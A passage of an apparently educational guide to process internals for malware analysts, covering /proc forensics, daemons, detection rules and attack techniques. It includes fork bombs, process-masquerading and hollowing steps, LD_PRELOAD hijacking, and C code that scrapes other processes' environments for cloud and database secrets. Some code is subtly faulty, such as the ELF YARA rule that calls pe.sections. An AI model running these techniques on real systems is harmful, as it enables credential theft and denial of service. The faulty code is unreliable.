| C2 config delivery | `C2_HOST=1.2.3.4` | Config passed without args/files |
| Anti-sandbox | `__COMPAT_LAYER=...` | Environment-based VM detection |
| Python path | `PYTHONPATH=/evil` | Hijack Python module imports |
| Node.js | `NODE_PATH=/evil` | Hijack Node module resolution |

**LD_PRELOAD** is exploited by **Jynx rootkit**, **Azazel**, and numerous Linux
privilege escalation techniques. When a process is spawned with `LD_PRELOAD` set,
the dynamic linker loads the specified library **before** all others, allowing
function interception (hooking) without modifying the binary.

---

## 17. Process Scheduling and Priority

### 17.1 Linux Scheduling Classes

```
Scheduling Policy Hierarchy (highest priority = executed first):

+----------------------------------+  Priority
| Stop class        (TASK_STOPPED) |  (internal)
+----------------------------------+
| Deadline class    (SCHED_DEADLINE)|  Earliest-deadline-first
| Real-time class   (SCHED_FIFO)   |  RT priority 99 (highest)
| Real-time class   (SCHED_RR)     |  RT priority 1-99 (round-robin)
+----------------------------------+  ^^^ PREEMPT all below ^^^
| Normal class      (SCHED_NORMAL) |  CFS (Completely Fair Scheduler)
| Normal class      (SCHED_BATCH)  |  CFS, longer time quanta
| Normal class      (SCHED_IDLE)   |  Lowest priority (run when idle)
+----------------------------------+
| Idle class        (pid 0 only)   |  CPU idle loop
+----------------------------------+
```

```c
#include <sched.h>
#include <sys/resource.h>
#include <unistd.h>

/* Nice value: -20 (highest priority) to +19 (lowest priority) */
/* Only root can decrease (increase priority, lower nice value) */

nice(5);                           /* increase nice by 5 (lower priority) */
setpriority(PRIO_PROCESS, 0, 10); /* set nice value directly; 0=self */
int prio = getpriority(PRIO_PROCESS, 0);

/* Set real-time scheduling */
struct sched_param sp = { .sched_priority = 50 };
sched_setscheduler(0, SCHED_FIFO, &sp);  /* requires CAP_SYS_NICE */

/* Resource limits */
struct rlimit rl;
getrlimit(RLIMIT_NPROC, &rl);    /* max processes for this UID */
getrlimit(RLIMIT_NOFILE, &rl);   /* max open file descriptors */
getrlimit(RLIMIT_AS, &rl);       /* max virtual address space size */
getrlimit(RLIMIT_CORE, &rl);     /* max core dump size */
setrlimit(RLIMIT_CORE, &rl);     /* set new limits */
```

---

## 18. Daemon Process Architecture

### 18.1 Complete Daemon in Rust

```rust
use std::fs;
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use nix::unistd::{fork, ForkResult, setsid, chdir, getpid};
use nix::sys::stat::umask;
use nix::sys::stat::Mode;

pub fn daemonize(pidfile: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Fork 1
    match unsafe { fork() }? {
        ForkResult::Parent { .. } => std::process::exit(0),
        ForkResult::Child => {}
    }

    // New session
    setsid()?;

    // Fork 2: ensure we can never acquire controlling terminal
    match unsafe { fork() }? {
        ForkResult::Parent { .. } => std::process::exit(0),
        ForkResult::Child => {}
    }

    // Reset umask
    umask(Mode::empty());

    // Change to safe directory
    chdir("/")?;

    // Redirect stdin/stdout/stderr to /dev/null
    let devnull = std::fs::OpenOptions::new()
        .read(true).write(true)
        .open("/dev/null")?;

    unsafe {
        use std::os::unix::io::AsRawFd;
        libc::dup2(devnull.as_raw_fd(), 0);
        libc::dup2(devnull.as_raw_fd(), 1);
        libc::dup2(devnull.as_raw_fd(), 2);
    }

    // Write PID file
    let mut file = fs::File::create(pidfile)?;
    writeln!(file, "{}", getpid())?;
    fs::set_permissions(pidfile, fs::Permissions::from_mode(0o644))?;

    Ok(())
}
```

### 18.2 Complete Daemon in Go

```go
import (
    "fmt"
    "os"
    "syscall"
)

// Go cannot truly double-fork because the runtime uses multiple OS threads.
// Use the re-exec pattern instead: process re-executes itself with a flag.

func daemonizeGo() {
    if os.Getenv("DAEMON_ACTIVE") == "1" {
        // We are the daemon child
        syscall.Setsid()
        os.Chdir("/")
        devnull, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
        os.Stdin = devnull
        os.Stdout = devnull
        os.Stderr = devnull
        return  // continue as daemon
    }

    // Spawn ourselves as a daemon
    cmd := exec.Command(os.Args[0], os.Args[1:]...)
    cmd.Env = append(os.Environ(), "DAEMON_ACTIVE=1")
    cmd.Stdin = nil
    cmd.Stdout = nil
    cmd.Stderr = nil
    cmd.SysProcAttr = &syscall.SysProcAttr{
        Setsid: true,   // new session
        Noctty: true,   // no controlling terminal
    }

    if err := cmd.Start(); err != nil {
        fmt.Fprintf(os.Stderr, "failed to daemonize: %v\n", err)
        os.Exit(1)
    }

    // Write PID file
    pid := cmd.Process.Pid
    os.WriteFile("/run/mydaemon.pid", []byte(fmt.Sprintf("%d\n", pid)), 0644)

    cmd.Process.Release()  // detach from parent
    os.Exit(0)             // parent exits
}
```

---

## 19. The /proc Filesystem as Intelligence Source

`/proc` is a **virtual filesystem** — the kernel constructs its content dynamically
from kernel data structures. For a malware analyst, `/proc` is a goldmine.

### 19.1 Per-Process /proc Entries

```
/proc/PID/
  |
  +-- cmdline           : full command line (null-separated args)
  |   Use: detect argument manipulation, spot masquerading processes
  |
  +-- comm              : first 15 chars of executable name (can be set by prctl!)
  |   Differs from exe basename -> process name manipulation detected
  |
  +-- exe               : symlink to actual executable binary on disk
  |   Deleted binary: shows as "/path/to/binary (deleted)"
  |   Memfd exec: shows as "/memfd:name (deleted)"
  |
  +-- maps              : virtual memory mappings (one line per VMA)
  |   Format: addr-addr perms offset dev inode pathname
  |   Look for: rwx regions (shellcode), [heap] with exec perms,
  |             anonymous rwx regions, suspicious .so paths
  |
  +-- mem               : raw virtual address space (read/write with lseek)
  |   Readable by root or process itself with appropriate ptrace check
  |   Used by: debuggers, memory forensics, malware injectors
  |
  +-- status            : human-readable process info
  |   Fields of interest:
  |     State:    R (running) S (sleeping) D (uninterruptible) Z (zombie) T (traced)
  |     TracerPid: <non-zero> means debugger attached -- ANTI-DEBUG CHECK
  |     VmRSS:    resident set size (actual RAM usage)
  |     Threads:  thread count
  |     CapEff:   effective capabilities bitmap
  |
  +-- fd/               : directory of file descriptor symlinks
  |   /proc/PID/fd/0 -> /dev/pts/0 (stdin)
  |   /proc/PID/fd/1 -> /dev/pts/0 (stdout)
  |   /proc/PID/fd/5 -> socket:[12345] (network connection!)
  |   Use: detect covert channels, hidden network connections
  |
  +-- fdinfo/           : detailed per-fd info (position, flags, etc.)
  |
  +-- net/tcp           : TCP connections of this process
  +-- net/udp           : UDP connections
  +-- net/tcp6          : IPv6 TCP
  |   These show local/remote address:port and connection state
  |
  +-- environ           : current environment variables (null-separated)
  |   WARNING: process can modify its own environment after exec
  |   Readable only by process owner or root
  |
  +-- smaps             : detailed memory map with RSS, PSS, dirty pages
  |   Use: detect injected code regions (high RSS anonymous rwx regions)
  |
  +-- smaps_rollup      : aggregated smaps data
  |
  +-- syscall           : current syscall being executed (if in kernel)
  |   Format: syscall_number A1 A2 A3 A4 A5 A6 stack_pointer program_counter
  |   Use: identify what system calls a process is currently executing
  |
  +-- wchan             : kernel function process is sleeping in
  |   Shows as "futex_wait" for mutex wait, "do_syscall" for syscall
  |
  +-- cgroup            : cgroup membership
  |   Use: determine if inside container (cgroup path contains "docker" etc.)
  |
  +-- ns/               : namespace symlinks
  |   ns/pid, ns/net, ns/mnt, ns/uts, ns/ipc
  |   Same inode number = same namespace
  |   Use: determine container vs host, detect namespace escapes
  |
  +-- root/             : process's root directory (see chroot jails)
  +-- cwd/              : current working directory symlink
```

```c
/* Read TracerPid to detect debugger (anti-debug relevant) */
bool check_tracer(void)
{
    char status[4096];
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd < 0) return false;
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    status[n] = '\0';

    char *p = strstr(status, "TracerPid:");
    if (!p) return false;
    int tracer_pid = atoi(p + 10);
    return tracer_pid != 0;  /* non-zero = debugger attached */
}

/* Parse /proc/PID/maps to find rwx regions */
void find_rwx_regions(pid_t pid)
{
    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    FILE *fp = fopen(maps_path, "r");
    if (!fp) return;

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        /* Line format: addr-addr perms offset dev inode [path] */
        /* Check perms field for "rwx" */
        if (strlen(line) > 20 && line[19] == 'x' &&
            line[17] == 'r' && line[18] == 'w') {
            printf("[!] RWX region: %s", line);
        }
    }
    fclose(fp);
}
```

### 19.2 Reading Process Memory via /proc/PID/mem

```c
/* Read memory from another process via /proc/mem (requires privileges) */
ssize_t read_process_memory(pid_t pid, void *remote_addr,
                             void *local_buf, size_t len)
{
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) return -1;

    /* lseek to the virtual address we want to read */
    lseek(fd, (off_t)(uintptr_t)remote_addr, SEEK_SET);
    ssize_t bytes_read = read(fd, local_buf, len);
    close(fd);
    return bytes_read;
}

/* THIS IS HOW MEMORY FORENSICS WORKS:
 * Tools like gcore, procdump, and some malware families
 * use /proc/PID/mem to dump process memory WITHOUT ptrace.
 * This bypasses ptrace-based anti-debug checks entirely!
 * The check is still TracerPid (ptrace attach = sets TracerPid).
 * /proc/mem read does NOT set TracerPid.
 */
```

---

## 20. Security and Malware Relevance

### 20.1 Process Masquerading — Argument Manipulation

Malware can manipulate its visible name and arguments in several ways:

```c
/* 1. Set argv[0] at launch time (C — modify before exec) */
char *argv[] = { "sshd", "-D", NULL };  /* looks like sshd in ps */
execv("/tmp/malware", argv);            /* actually runs malware */

/* 2. Modify argv[0] in-place after exec (modifies /proc/PID/cmdline!) */
int main(int argc, char *argv[])
{
    /* Zero out real args */
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    /* Write fake name over argv[0] memory */
    strncpy(argv[0], "[kworker/u8:2]", strlen(argv[0]));
    /* Now /proc/PID/cmdline shows "[kworker/u8:2]" */
    /* But /proc/PID/exe still shows real binary! */
}

/* 3. Set process comm via prctl (changes /proc/PID/comm) */
prctl(PR_SET_NAME, "kworker/0:1", 0, 0, 0);
```

**Detection**: Compare `/proc/PID/cmdline` (modifiable) against
`/proc/PID/exe` (real binary path). If `basename(/proc/PID/exe)` ≠ `argv[0]`,
that's a masquerading indicator. Many rootkits show `comm` as kernel thread names
like `[kworker/...]` but their `/proc/PID/exe` reveals the truth.

### 20.2 Fork Bomb Analysis

```c
/* The classic fork bomb — system-level DoS */
int main(void) {
    while (1) fork();
    /* Each fork() doubles processes.
     * 2^30 attempts = 1 billion processes (fail at PID table limit)
     * Each failed fork still consumes CPU (syscall overhead)
     * System becomes unresponsive as scheduler is overwhelmed
     * Countermeasure: RLIMIT_NPROC (ulimit -u <count>)
     * Also: pam_limits.so in /etc/security/limits.conf
     */
}
/* Shell equivalent: :(){ :|:& };: */
```

```rust
// Rust fork bomb (academic — do not run)
use nix::unistd::fork;
fn main() {
    loop { unsafe { let _ = fork(); } }
}
```

```go
// Go fork bomb (uses goroutines, different resource exhaustion)
func main() {
    for { go func() { select{} }() }
    // Exhausts goroutine stack memory and scheduler overhead
    // Different from PID exhaustion — goroutines != processes
}
```

### 20.3 Process Hollowing — Conceptual Model

```
Step 1: Create target process in suspended state
  CreateProcessW("C:\\Windows\\System32\\notepad.exe", ...,
                 CREATE_SUSPENDED, ..., &pi)
  [notepad.exe maps into memory, primary thread suspended]

Step 2: Unmap legitimate image
  NtUnmapViewOfSection(pi.hProcess, ImageBase)
  [notepad's code removed from process address space]

Step 3: Allocate memory at same base or arbitrary base
  VirtualAllocEx(pi.hProcess, ImageBase, PayloadSize,
                 MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

Step 4: Write payload
  WriteProcessMemory(pi.hProcess, ImageBase, payload, size)

Step 5: Fix relocations (if payload's preferred base != loaded base)
  [Patch relocation table entries]

Step 6: Update thread context to new entry point
  GetThreadContext(pi.hThread, &ctx)
  ctx.Rcx = new_entry_point   // RCX = entry point in x64 Windows ABI
  SetThreadContext(pi.hThread, &ctx)

Step 7: Resume
  ResumeThread(pi.hThread)

Result: notepad.exe PID exists, pointing to our payload code
        Process Explorer shows "notepad.exe" with suspicious memory
        /proc equivalent: EPROCESS.ImageFileName = "notepad.exe"
        but VAD tree has rwx anonymous memory at image base

Detection:
  - Scan process memory for PE header at base address
    If PE optional header doesn't match executable on disk -> hollowing
  - Check VAD entry protection: IMAGE_EXECUTE_WRITECOPY -> EXECUTE_READWRITE
    (legitimate images are WRITECOPY, injected are READ_WRITE_EXECUTE)
  - Use Volatility: windows.malfind (finds injected PE headers)
  - Use Moneta/PE-Sieve for live process scanning
```

### 20.4 Credential Harvesting via /proc

```c
/* Reading environment variables of a privileged process */
/* Requires: root access or ptrace capability */
void harvest_env_from_proc(pid_t target_pid)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/environ", target_pid);

    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return; }

    char buf[65536];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);

    /* environ is null-separated "KEY=VALUE\0KEY=VALUE\0..." */
    char *ptr = buf;
    while (ptr < buf + n) {
        /* Look for credential-related vars */
        if (strncmp(ptr, "AWS_SECRET", 10) == 0 ||
            strncmp(ptr, "DB_PASSWORD", 11) == 0 ||
            strncmp(ptr, "PGPASSWORD", 10) == 0 ||
            strncmp(ptr, "GITHUB_TOKEN", 12) == 0) {
            printf("[CRED FOUND] %s\n", ptr);
        }
        ptr += strlen(ptr) + 1;
    }
}
```

**Real-world usage**: The **Siloscape** malware targeting Windows containers and
various Linux malware families enumerate `/proc/*/environ` looking for cloud
credentials, database passwords, and API tokens that are commonly passed to
containers and processes via environment variables.

### 20.5 MITRE ATT&CK Mapping for Process Techniques

| Technique | MITRE ID | Description |
|-----------|----------|-------------|
| Process Injection | T1055 | General process injection |
| Process Hollowing | T1055.012 | Inject into legitimate process container |
| PPID Spoofing | T1134.004 | Forge parent process for log evasion |
| Process Masquerading | T1036.005 | Rename malware to look like legit process |
| Fork Bomb | T1499 | Resource exhaustion (endp. denial of service) |
| /proc Memory Read | T1003.007 | Credential access via /proc/PID/mem |
| LD_PRELOAD Injection | T1574.006 | Hijack dynamic linker |
| ptrace Injection | T1055.008 | Code injection via ptrace API |
| Process Discovery | T1057 | Enumerate running processes |
| Daemon | T1543.004 | Create daemon for persistence |

---

## 21. Cross-Language Binary Signatures

### 21.1 How C, Rust, Go Process Code Looks at the Binary Level

**C process creation — fork+exec signature**:
```nasm
; fork() -> returns child PID (parent) or 0 (child) or -1 (error)
call    fork@plt            ; syscall: fork (57 on x86-64)
test    eax, eax            ; check return value
js      .error              ; negative = error
jnz     .parent_code        ; non-zero = parent, eax = child PID
; === CHILD PATH ===
; ... setup code ...
call    execve@plt          ; syscall: execve (59 on x86-64)
; if execve returns, it failed:
call    _exit@plt           ; syscall: exit_group (231)
; === PARENT PATH ===
.parent_code:
mov     edi, eax            ; pid of child
call    waitpid@plt         ; wait for child
```

**Rust process creation — Command::spawn signature**:
```nasm
; Rust's std::process::Command::spawn() calls libc fork + exec
; But adds Rust-specific patterns:
; - Stack canary check before/after fork
; - Rust panic handler setup in child (for pre_exec errors)
; - LLVM-generated bounds check before argv construction
call    fork@plt
; Rust generates more verbose child error handling:
; If pre_exec fails -> writes error to pipe[1] -> _exit(1)
; Parent reads from pipe[0] to detect child error before exec
; This is the "error pipe" pattern unique to Rust's spawn implementation
```

**Go process creation — exec.Command signature**:
```nasm
; Go uses syscall.ForkExec -> syscall.forkAndExecInChild (assembly!)
; The fork is done in assembly in syscall/exec_linux.go
; to avoid triggering Go runtime (goroutine scheduler) issues

; Key Go-specific pattern: runtime.entersyscall / runtime.exitsyscall wrappers
; visible in strace as: clone3() rather than fork()
; Go uses clone3 with SIGCHLD flag

; Look for: pclntab (symbol table in .gopclntab section)
; runtime.main -> cmd/exec.Command -> forkExec path
; Go binary always has "go build" version string in .rodata
```

| Pattern | C | Rust | Go |
|---------|---|------|----|
| Fork syscall | `fork` (57) | `fork` via libc | `clone3` |
| Error handling | errno check | Result<> pipe | error return |
| Panic on child error | `_exit` direct | Rust panic infra | os.Exit |
| argv construction | char *[] literal | CString Vec | []string slice |
| env handling | environ global | environ copy | os.Environ() copy |
| Symbol visibility | minimal (stripped) | demangled (cargo debug) | pclntab always present |

---

## 22. Expert Mental Model: Synthesis

A process is a **kernel illusion of resource ownership** — a virtualization layer
the OS presents to code so it can operate as if it owns all of memory, all of the
CPU, and all of the hardware. Understanding this illusion at every level of the
stack is what separates an elite analyst from a tool operator.

**How the top 1% internalizes this**:

When you see malware spawning a process, you ask not "what command is it running"
but rather "what resources is this process container being provisioned with, and what
does the kernel's PCB look like for it at moment of creation?" Because the answer
tells you everything: what credentials it inherited (check UID/EUID delta for setuid
exploitation), what file descriptors it carries (network socket? persistence pipe?),
what namespace it lives in (containerized? attempting escape?), and what its parent
relationship claims (PPID spoofed? credential chain broken?).

When you write a YARA or Sigma rule for process-based techniques, you're not just
pattern-matching strings — you're capturing the **state transition** of the kernel
data structures. Process hollowing isn't just "suspicious WriteProcessMemory" — it's
"EPROCESS with legitimate ImageFileName + VAD node with protection mismatch + thread
context redirect." The rule that fires on any single observation is fragile; the rule
that models the kernel state machine produces zero false positives.

The `/proc` filesystem is not a debugging convenience — it is a **live dump of
kernel data structures** accessible without a debugger. Every analyst who hasn't
read `/proc/PID/smaps` during active incident response is leaving signal on the table.
Every analyst who doesn't correlate `TracerPid`, `VmRSS`, rwx VMA presence, and
`fd/` directory listings simultaneously is doing incomplete triage.

Rust, Go, and C all produce processes that look identical to the kernel — same PCB,
same VAS, same syscall interface. But they produce distinguishably **different
patterns at the binary and behavioral level**: Go's `clone3` vs C's `fork`, Rust's
error-pipe pattern in spawn, Go's goroutine scheduler touching `futex` before any
child work begins. These behavioral signatures are how you fingerprint malware
written in cross-language chains without reading source code.

> **The fundamental insight**: Process management is the OS's API for
> resource lifecycle. Every attack on a system — injection, persistence,
> privilege escalation, evasion — touches process management. Owning this
> knowledge means owning the mental model of every technique built on top of it.

---

## Appendix A: Quick Reference — System Call Numbers (Linux x86-64)

| Syscall    | Number | Key Args                                          |
|------------|--------|---------------------------------------------------|
| read       | 0      | fd, buf, count                                    |
| write      | 1      | fd, buf, count                                    |
| open       | 2      | path, flags, mode                                 |
| close      | 3      | fd                                                |
| mmap       | 9      | addr, len, prot, flags, fd, offset                |
| mprotect   | 10     | addr, len, prot (rwx change!)                     |
| munmap     | 11     | addr, len                                         |
| brk        | 12     | addr (heap expansion)                             |
| pipe       | 22     | pipefd[2]                                         |
| dup2       | 33     | oldfd, newfd                                      |
| getpid     | 39     | (void) -> pid                                     |
| fork       | 57     | (void) -> pid_t                                   |
| execve     | 59     | path, argv[], envp[]                              |
| exit       | 60     | status                                            |
| wait4      | 61     | pid, wstatus, options, rusage                     |
| kill       | 62     | pid, sig                                          |
| getppid    | 110    | (void) -> pid                                     |
| setpgid    | 109    | pid, pgid                                         |
| setsid     | 112    | (void) -> sid                                     |
| getsid     | 124    | pid -> sid                                        |
| prctl      | 157    | option, arg2, arg3, arg4, arg5                    |
| clone      | 56     | fn, stack, flags, arg                             |
| unshare    | 272    | flags (namespace isolation)                       |
| ptrace     | 101    | request, pid, addr, data                          |
| pipe2      | 293    | pipefd[2], flags                                  |
| execveat   | 322    | dirfd, path, argv, envp, flags                    |
| clone3     | 435    | struct clone_args, size                           |
| exit_group | 231    | status (kills all threads!)                       |

---

## Appendix B: YARA Rule — Suspicious Process Manipulation

```yara
rule process_masquerade_linux {
    meta:
        description = "Detects binaries that manipulate their own process name"
        author      = "Elite Analyst"
        mitre       = "T1036.005"
        reference   = "Process masquerading via prctl/argv manipulation"

    strings:
        /* prctl(PR_SET_NAME, ...) call pattern */
        $prctl_set_name = { B8 9D 00 00 00 BF 0F 00 00 00 }
        /* "PR_SET_NAME = 15 (0x0F), prctl = 157 (0x9D)" */

        /* Common fake kernel thread names used by malware */
        $kworker   = "[kworker/" ascii nocase
        $ksoftirqd = "[ksoftirqd/" ascii nocase
        $kswapd    = "[kswapd" ascii nocase
        $migration = "[migration/" ascii nocase

        /* Direct argv[0] overwrite pattern: memset+strncpy on argv */
        $argv_overwrite = {
            4? 8B ?? 08          /* mov r??, [rsp+8]  <- argv[0] */
            31 C0                /* xor eax, eax */
            E8 ?? ?? ?? ??       /* call memset/bzero */
        }

    condition:
        uint32(0) == 0x464C457F     /* ELF magic */
        and filesize < 10MB
        and (
            ($prctl_set_name and 1 of ($kworker, $ksoftirqd, $kswapd, $migration))
            or $argv_overwrite
        )
}
```

```yara
rule fork_bomb_detect {
    meta:
        description = "Detects fork bomb patterns in ELF binaries"
        mitre       = "T1499"

    strings:
        /* fork() in infinite loop: call fork; test; jmp back */
        $fork_loop_x64 = {
            E8 ?? ?? ?? ??    /* call fork */
            85 C0             /* test eax, eax */
            7? ??             /* jl/je (skip child path) */
            EB ??             /* jmp (back to call fork) */
        }

    condition:
        uint32(0) == 0x464C457F
        and $fork_loop_x64
        and not for any section in pe.sections: (section.name == ".debug_info")
}
```

---

## Appendix C: Sigma Rule — Suspicious Child Process Spawning

```yaml
title: Suspicious Process Spawning from Unusual Parent
id: process-spawn-anomaly-001
status: experimental
description: |
    Detects child processes spawned from unusual parents.
    Indicative of process injection or PPID spoofing.
author: Elite Analyst
date: 2024-01-01
mitre:
    - T1055.012  # Process Hollowing
    - T1134.004  # PPID Spoofing
    - T1059.003  # Windows Command Shell

logsource:
    category: process_creation
    product: windows

detection:
    selection_suspicious_parent:
        ParentImage|endswith:
            - '\notepad.exe'
            - '\calc.exe'
            - '\mspaint.exe'
            - '\wordpad.exe'
            - '\winword.exe'
            - '\excel.exe'
    selection_suspicious_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    filter_legit:
        CommandLine|contains:
            - 'open'
            - 'print'

    condition: selection_suspicious_parent AND selection_suspicious_child
               AND NOT filter_legit

falsepositives:
    - Macro-enabled Office documents (investigate further, not whitelist)
    - Legitimate automation tooling (document specifically)
level: high
tags:
    - attack.defense_evasion
    - attack.execution
```

---

*This document covers process management from kernel data structures through
language-level APIs, with continuous focus on how each concept maps to
attack techniques, detection rules, and analyst methodology. Every section
is a building block — understanding the kernel data structures makes the
C/Rust/Go implementations obvious; understanding the implementations makes
the malware techniques transparent; understanding the techniques makes the
detection rules inevitable rather than guessed.*
